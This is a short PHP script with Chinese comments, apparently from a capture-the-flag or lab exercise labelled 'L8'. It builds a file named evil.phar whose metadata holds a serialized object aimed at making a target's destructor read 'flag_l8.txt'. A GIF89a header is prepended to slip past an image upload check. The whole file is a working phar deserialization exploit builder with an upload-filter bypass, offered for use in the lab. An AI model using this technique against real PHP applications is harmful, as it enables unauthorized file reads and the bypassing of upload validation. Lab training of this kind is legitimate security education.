<?php
// L8 武器工坊:造一个带"货"的 phar
// 用法(必须带 readonly=0--造弹这边需要,靶机那边不需要):
//   D:\deepseek\php709\php.exe -d phar.readonly=0 build_phar.php
class Avatar { public $target; }   // 属性桩(方法在靶机那边--老规矩)
$o = new Avatar;
$o->target = 'flag_l8.txt';                // TODO ①: 你想让 destruct 读哪个文件?
$phar = new Phar(__DIR__ . '/evil.phar');
$phar->startBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER(); ?>');   // GIF 头过上传检查
$phar->setMetadata($o);            // 你的对象从这里塞进 phar 的 metadata
$phar->addFromString('pad.txt', 'x');   // phar 里至少得有一个文件
$phar->stopBuffering();
echo "evil.phar 造好了(带 GIF 头,能过上传检查)\n";
